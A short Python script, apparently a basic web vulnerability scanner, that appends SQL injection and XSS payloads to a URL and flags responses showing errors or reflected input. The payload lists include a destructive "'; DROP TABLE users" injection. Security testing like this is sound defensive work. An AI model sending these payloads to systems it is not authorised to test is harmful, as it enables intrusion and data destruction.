import requests

def test_sql_injection(url):
    sqli_payloads = [
        "' OR 1=1 --", 
        "' UNION SELECT NULL, NULL, NULL --", 
        "' AND 1=2 --",  
        "'; DROP TABLE users --",  
    ]

    for payload in sqli_payloads:
        response = requests.get(url + payload)
        if "error" in response.text or "syntax" in response.text:
            print(f"Possible SQL Injection vulnerability found with payload: {payload}")

def test_xss(url):
    xss_payloads = [
        "<script>alert('XSS');</script>",  
        "<img src='x' onerror='alert(1)'>",  
        "<a href='javascript:alert(1)'>Click me</a>",  
    ]

    for payload in xss_payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"Possible XSS vulnerability found with payload: {payload}")

def main(url):
    print(f"Testing for vulnerabilities on {url}...")
    test_sql_injection(url)
    test_xss(url)

# Contoh penggunaan
main("http://example.com/search?q=")
